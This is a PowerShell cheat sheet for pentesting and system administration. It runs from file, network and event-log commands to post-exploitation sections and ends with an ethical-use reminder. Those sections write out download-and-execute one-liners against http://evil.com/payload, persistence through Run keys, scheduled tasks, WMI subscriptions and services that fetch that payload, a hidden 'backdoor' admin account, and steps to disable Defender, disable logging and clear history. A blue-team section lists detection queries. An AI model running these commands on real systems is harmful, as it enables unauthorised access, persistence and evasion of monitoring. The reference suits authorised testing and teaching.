# PowerShell Cheat Sheet for Pentesting & Sysadmin

> **⚡ PowerShell Command Reference for Security Professionals**  
> *Run PowerShell as Administrator for most system-level commands*

---

## 🗂️ File System Operations

| Command | Alias | Description |
|---------|-------|-------------|
| `Get-ChildItem` | `dir`, `ls`, `gci` | List directory contents |
| `Get-ChildItem -Recurse -Hidden` | `ls -la` | Show hidden files recursively |
| `Copy-Item -Path .\source.txt -Destination .\backup` | `cp`, `copy`, `cpi` | Copy files/directories |
| `Move-Item -Path .\file.txt -Destination C:\temp` | `mv`, `move`, `mi` | Move files/directories |
| `Remove-Item -Path .\temp.txt -Force` | `rm`, `del`, `ri` | Delete files/directories |
| `Get-Content -Path .\passwords.txt -Tail 10` | `cat`, `gc`, `type` | View file contents (last 10 lines) |
| `Set-Content -Path .\note.txt -Value "Important!"` | `sc`, `echo` | Create/write to file |
| `New-Item -ItemType Directory -Path "C:\temp"` | `mkdir` | Create directory |
| `Test-Path C:\Windows\System32\cmd.exe` | | Check if file/path exists |

### Advanced File Operations
```powershell
# Find files by extension
Get-ChildItem -Recurse -Include *.txt, *.log

# Search for files containing specific text
Get-ChildItem -Recurse | Select-String "password" -List

# Get file hashes
Get-FileHash -Path .\file.exe -Algorithm SHA256

# Find large files (>100MB)
Get-ChildItem -Recurse | Where-Object {$_.Length -gt 100MB}

# Show file permissions
Get-Acl C:\Windows\System32\config\SAM | Format-List
```

---

## 🔍 Text Searching & Processing

| Command | Description |
|---------|-------------|
| `Select-String -Path C:\logs\*.log -Pattern "error"` | Search for text patterns in files |
| `Get-ChildItem -Recurse \| Select-String "password"` | Recursive search for text |
| `Get-Content .\data.csv \| ConvertFrom-Csv` | Parse CSV files |
| `"text" \| Out-File output.txt` | Redirect output to file |
| `Select-String -Pattern "admin" -Path .\users.txt -Context 2,2` | Show 2 lines before/after match |

### Advanced Text Processing
```powershell
# Extract IP addresses from logs
Select-String -Pattern '\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b' -Path .\access.log

# Find email addresses
Select-String -Pattern '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b' -Path .\data.txt

# Count occurrences
(Select-String -Pattern "failed login" -Path .\security.log).Count

# Extract unique values
Get-Content .\ips.txt | Sort-Object | Get-Unique
```

---

## 🖥️ System Information

| Command | Description |
|---------|-------------|
| `Get-ComputerInfo` | Get comprehensive system info |
| `Get-HotFix` | List installed updates/patches |
| `systeminfo` | Classic system information |
| `Get-Location` | `pwd`, `gl` - Print working directory |
| `[Environment]::OSVersion` | Get OS version details |
| `Get-WmiObject -Class Win32_OperatingSystem` | Detailed OS information |
| `Get-CimInstance -ClassName Win32_ComputerSystem` | Hardware information |

### Advanced System Enumeration
```powershell
# Get system architecture
[Environment]::Is64BitOperatingSystem

# List installed software
Get-WmiObject -Class Win32_Product | Select-Object Name, Version

# Check Windows Defender status
Get-MpComputerStatus

# Get environment variables
Get-ChildItem Env:

# Check PowerShell version
$PSVersionTable

# Get timezone information
Get-TimeZone

# List startup programs
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location
```

---

## ⚙️ Process & Service Management

| Command | Description |
|---------|-------------|
| `Get-Process \| Where-Object {$_.CPU -gt 50}` | `ps`, `gps` - List processes (CPU >50%) |
| `Start-Process notepad.exe` | `start` - Launch new process |
| `Stop-Process -Name malware -Force` | `kill` - Terminate process |
| `Get-Service \| Where-Object {$_.Status -eq 'Running'}` | `gsv` - List running services |
| `Restart-Service -Name Spooler -Force` | Restart a service |

### Advanced Process Operations
```powershell
# Get process with full command line
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine

# Find processes by path
Get-Process | Where-Object {$_.Path -like "*temp*"}

# Get process owner
Get-WmiObject Win32_Process | Select-Object Name, @{Name="Owner";Expression={$_.GetOwner().User}}

# Monitor new processes (requires admin)
Register-WmiEvent -Query "SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2"

# Kill processes by name pattern
Get-Process | Where-Object {$_.Name -like "*malware*"} | Stop-Process -Force

# Get service dependencies
Get-Service -Name "Themes" -DependentServices
```

---

## 🌐 Network Operations

| Command | Description |
|---------|-------------|
| `Test-NetConnection 10.1.2.3 -Port 80` | `tnc` - Test port connectivity |
| `1..255 \| % {ping -n 1 10.1.2.$_ \| ?{$_ -match 'TTL'}}` | Ping sweep (10.1.2.0/24) |
| `1..1024 \| % {try{(New-Object Net.Sockets.TcpClient).Connect("10.1.2.3",$_);"Port $_ open"}catch{}}` | Port scan (1-1024) |
| `Get-NetTCPConnection \| Where-Object {$_.State -eq 'Established'}` | View active connections |
| `Invoke-WebRequest -Uri http://example.com -OutFile page.html` | `curl`, `iwr` - Download file |

### Advanced Network Reconnaissance
```powershell
# Fast ping sweep
1..254 | ForEach-Object {
    $ip = "192.168.1.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet) {
        "$ip is alive"
    }
}

# Port scan with threading
$ports = 21,22,23,25,53,80,110,443,993,995
$target = "192.168.1.1"
$ports | ForEach-Object -Parallel {
    if (Test-NetConnection -ComputerName $using:target -Port $_ -InformationLevel Quiet) {
        "Port $_ is open on $using:target"
    }
} -ThrottleLimit 50

# Get network adapters
Get-NetAdapter | Where-Object {$_.Status -eq "Up"}

# Show routing table
Get-NetRoute

# DNS lookup
Resolve-DnsName google.com -Type A

# Get ARP table
Get-NetNeighbor

# Download and execute (be careful!)
IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')
```

---

## 🔒 Security & Administration

| Command | Description |
|---------|-------------|
| `Get-NetFirewallRule \| Format-Table Name,Enabled` | List firewall rules |
| `New-NetFirewallRule -DisplayName "Allow RDP" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow` | Create firewall rule |
| `Get-LocalUser` | List local user accounts |
| `Add-LocalGroupMember -Group "Administrators" -Member "hacker"` | Add user to admin group |
| `Get-WinEvent -LogName Security -MaxEvents 50` | View security event logs |

### Advanced Security Operations
```powershell
# Check user privileges
whoami /priv

# List local groups
Get-LocalGroup

# Get group members
Get-LocalGroupMember -Group "Administrators"

# Check password policy
Get-ADDefaultDomainPasswordPolicy

# View failed login attempts
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4625} | Select-Object -First 10

# Check for null sessions
Get-WmiObject -Class Win32_Share

# List scheduled tasks
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}

# Check UAC status
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA

# Disable Windows Defender (requires admin)
Set-MpPreference -DisableRealtimeMonitoring $true

# Check execution policy
Get-ExecutionPolicy -List
```

---

## 🏃‍♂️ Post-Exploitation & Persistence

### User & Privilege Operations
```powershell
# Create new local user
New-LocalUser -Name "backdoor" -Password (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force) -Description "System Account"

# Hide user from login screen
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "backdoor" -Value 0 -PropertyType DWord

# Enable RDP
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Check if user is admin
([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
```

### Registry Operations
```powershell
# Navigate registry
Set-Location HKLM:\
Get-ChildItem

# Read registry value
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Name "ProductName"

# Create registry key
New-Item -Path "HKLM:\SOFTWARE\MyApp" -Force

# Set registry value
Set-ItemProperty -Path "HKLM:\SOFTWARE\MyApp" -Name "Version" -Value "1.0"

# Backup registry key
reg export "HKLM\SOFTWARE\MyApp" C:\backup.reg

# Auto-start persistence
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "C:\Windows\System32\backdoor.exe"
```

---

## 📊 Data Export & Formatting

| Command | Description |
|---------|-------------|
| `Get-Process \| Export-Csv processes.csv -NoTypeInformation` | Export to CSV |
| `Get-Service \| ConvertTo-Html > services.html` | Export to HTML |
| `Get-Process \| Format-List *` | `fl` - Format as list |
| `Get-EventLog -LogName System -Newest 10 \| Format-Table -AutoSize` | `ft` - Format as table |
| `Get-Process \| ConvertTo-Json` | Export to JSON |

### Advanced Data Operations
```powershell
# Custom object creation
$obj = [PSCustomObject]@{
    Name = "Server01"
    IP = "192.168.1.100"
    Status = "Online"
}

# Filter and sort
Get-Process | Where-Object {$_.WorkingSet -gt 100MB} | Sort-Object WorkingSet -Descending

# Group data
Get-Service | Group-Object Status

# Measure objects
Get-ChildItem C:\ | Measure-Object -Property Length -Sum

# Select specific properties
Get-Process | Select-Object Name, CPU, @{Name="Memory(MB)";Expression={$_.WorkingSet/1MB}}
```

---

## 🧰 Utility Commands

| Command | Description |
|---------|-------------|
| `Get-Command` | `gcm` - List available commands |
| `Get-Help Get-Process -Examples` | `help` - Show command help |
| `Set-ExecutionPolicy RemoteSigned -Scope CurrentUser` | Change script execution policy |
| `Clear-History` | Clear command history |
| `cd HKLM:` then `ls` | Navigate Windows registry |
| `Get-Module -ListAvailable` | List available modules |

### PowerShell Customization
```powershell
# Check PowerShell profile location
$PROFILE

# Create custom function
function Get-SystemInfo {
    Get-ComputerInfo | Select-Object WindowsProductName, TotalPhysicalMemory, CsProcessors
}

# Create alias
Set-Alias -Name "ll" -Value "Get-ChildItem"

# Import module
Import-Module ActiveDirectory

# Get command syntax
Get-Command Get-Process -Syntax
```

---

## 💡 Pro Tips & Advanced Techniques

### 1. Bypass Execution Policy
```powershell
# Method 1: Bypass flag
powershell -ep bypass -c "Get-Process"

# Method 2: Unrestricted for current user
Set-ExecutionPolicy Unrestricted -Scope CurrentUser

# Method 3: Download and execute
powershell -c "iex (iwr 'http://example.com/script.ps1')"

# Method 4: Encoded command
$command = "Get-Process"
$bytes = [Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded
```

### 2. Remote Operations
```powershell
# Run commands remotely
Invoke-Command -ComputerName DC01 -ScriptBlock {Get-Process}

# Create persistent session
$session = New-PSSession -ComputerName Server01
Invoke-Command -Session $session -ScriptBlock {Get-Service}

# Copy files to remote system
Copy-Item -Path .\file.txt -Destination C:\temp\ -ToSession $session

# Enable PowerShell remoting
Enable-PSRemoting -Force
```

### 3. Stealth & Evasion
```powershell
# Hidden window execution
powershell -WindowStyle Hidden -c "command"

# No profile loading
powershell -nop -c "command"

# Combine stealth flags
powershell -nop -w hidden -ep bypass -c "iex (iwr 'http://evil.com/payload')"

# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Disable logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0
```

### 4. Download & Execute Techniques
```powershell
# Method 1: WebClient
(New-Object Net.WebClient).DownloadString('http://bit.ly/payload') | iex

# Method 2: Invoke-WebRequest
iex (iwr 'http://example.com/script.ps1' -UseBasicParsing).Content

# Method 3: Download file
Invoke-WebRequest -Uri 'http://example.com/tool.exe' -OutFile 'C:\temp\tool.exe'

# Method 4: Background download
Start-Job -ScriptBlock {iwr 'http://example.com/large-file.zip' -OutFile 'C:\temp\file.zip'}
```

### 5. Persistence Mechanisms
```powershell
# Registry Run key
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "powershell -w hidden -c iex (iwr 'http://evil.com/payload')"

# Scheduled task
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -c iex (iwr 'http://evil.com/payload')"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "SystemUpdate" -Action $action -Trigger $trigger

# WMI event subscription
$query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
Register-WmiEvent -Query $query -Action {iex (iwr 'http://evil.com/payload')}

# Service creation
New-Service -Name "WindowsUpdate" -BinaryPathName "powershell.exe -w hidden -c iex (iwr 'http://evil.com/payload')" -StartupType Automatic
```

---

## 🔍 Forensics & Investigation

### Event Log Analysis
```powershell
# Get security events
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624} | Select-Object -First 10

# Search for specific user logons
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624 -and $_.Message -like "*administrator*"}

# PowerShell execution logs
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4104}

# Failed logon attempts
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4625}

# Export events to CSV
Get-WinEvent -LogName System -MaxEvents 1000 | Export-Csv -Path "system_events.csv" -NoTypeInformation
```

### File System Forensics
```powershell
# Find recently modified files
Get-ChildItem -Recurse | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-1)}

# Search for suspicious file extensions
Get-ChildItem -Recurse -Include *.exe, *.bat, *.ps1, *.vbs | Where-Object {$_.CreationTime -gt (Get-Date).AddDays(-7)}

# Get file timestamps
Get-ItemProperty -Path "C:\suspicious\file.exe" | Select-Object CreationTime, LastWriteTime, LastAccessTime

# Find alternate data streams
Get-Item -Path "C:\file.txt" -Stream *
```

---

## 🚨 Blue Team Detection

### Monitoring PowerShell Activity
```powershell
# Enable PowerShell logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1

# Monitor for suspicious commands
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Message -like "*DownloadString*" -or $_.Message -like "*iex*" -or $_.Message -like "*Invoke-Expression*"}

# Check for encoded commands
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Message -like "*-enc*" -or $_.Message -like "*-EncodedCommand*"}

# Monitor process creation
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4688 -and $_.Message -like "*powershell*"}
```

---

## 📚 Quick Reference Tables

### Common Ports for Testing
| Port | Service | PowerShell Test |
|------|---------|-----------------|
| 21 | FTP | `Test-NetConnection target -Port 21` |
| 22 | SSH | `Test-NetConnection target -Port 22` |
| 23 | Telnet | `Test-NetConnection target -Port 23` |
| 25 | SMTP | `Test-NetConnection target -Port 25` |
| 53 | DNS | `Test-NetConnection target -Port 53` |
| 80 | HTTP | `Test-NetConnection target -Port 80` |
| 135 | RPC | `Test-NetConnection target -Port 135` |
| 139 | NetBIOS | `Test-NetConnection target -Port 139` |
| 443 | HTTPS | `Test-NetConnection target -Port 443` |
| 445 | SMB | `Test-NetConnection target -Port 445` |
| 3389 | RDP | `Test-NetConnection target -Port 3389` |

### PowerShell Operators
| Operator | Description | Example |
|----------|-------------|---------|
| `-eq` | Equal | `$a -eq $b` |
| `-ne` | Not equal | `$a -ne $b` |
| `-gt` | Greater than | `$a -gt 5` |
| `-lt` | Less than | `$a -lt 10` |
| `-like` | Wildcard match | `$name -like "*admin*"` |
| `-match` | Regex match | `$text -match '\d+'` |
| `-contains` | Contains | `$array -contains "value"` |
| `-in` | In array | `"value" -in $array` |

---

> **🛡️ Ethical Use Reminder**: This cheat sheet is for legitimate system administration, security testing, and educational purposes. Always ensure you have proper authorization before running these commands on systems you don't own.
```

This comprehensive PowerShell cheat sheet covers everything from basic file operations to advanced post-exploitation techniques, making it perfect for both system administrators and security professionals! 🚀
